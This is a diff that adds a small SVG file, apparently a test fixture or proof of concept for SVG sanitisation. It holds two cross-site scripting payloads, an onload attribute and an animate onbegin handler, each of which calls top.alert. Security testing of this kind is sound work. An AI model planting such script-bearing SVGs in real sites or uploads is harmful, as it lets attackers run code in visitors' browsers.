@@ -1,0 +1,4 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+     onload="top.alert('xss poc from svg3')">
+  <animate onbegin="top.alert('xss poc from svg3')" attributeName="x" from="0" to="1" dur="1s" begin="0s"/>
+</svg>
